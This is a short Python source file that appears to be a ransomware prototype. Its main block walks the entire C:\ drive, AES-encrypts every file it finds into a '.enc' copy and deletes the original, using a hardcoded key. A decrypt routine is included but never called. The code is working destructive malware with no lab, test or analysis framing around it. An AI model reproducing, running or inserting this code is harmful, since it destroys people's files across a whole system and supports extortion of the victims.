import os
from Crypto.Cipher import AES

KEY = b"gostodefodernopelo321@32" # Take key in another place. (later?)
BASE_DIR = "C:\\"


def encrypt_file(key, input_file):
    output_file = input_file + ".enc"

    cipher = AES.new(key, AES.MODE_EAX)
    nonce = cipher.nonce

    with open(input_file, "rb") as f:
        data = f.read()

    ciphertext, tag = cipher.encrypt_and_digest(data)

    with open(output_file, "wb") as f:
        f.write(nonce)
        f.write(tag)
        f.write(ciphertext)

    os.remove(input_file)



def decrypt_file(key, input_file):
    output_file = input_file.replace(".enc", "")

    with open(input_file, "rb") as f:
        nonce = f.read(16)
        tag = f.read(16)
        ciphertext = f.read()

    cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)
    plaintext = cipher.decrypt(ciphertext)

    try:
        cipher.verify(tag)
        with open(output_file, "wb") as f:
            f.write(plaintext)
        os.remove(input_file)
    except ValueError:
        print(f"[-] error: {input_file}")



def encrypt_all(base_path=BASE_DIR):
    for root, _, files in os.walk(base_path):
        for file in files:
            full_path = os.path.join(root, file)
            encrypt_file(KEY, full_path)


def decrypt_all(base_path=BASE_DIR):
    for root, _, files in os.walk(base_path):
        for file in files:
            if file.endswith(".enc"):
                full_path = os.path.join(root, file)
                decrypt_file(KEY, full_path)



if __name__ == "__main__":
    encrypt_all()
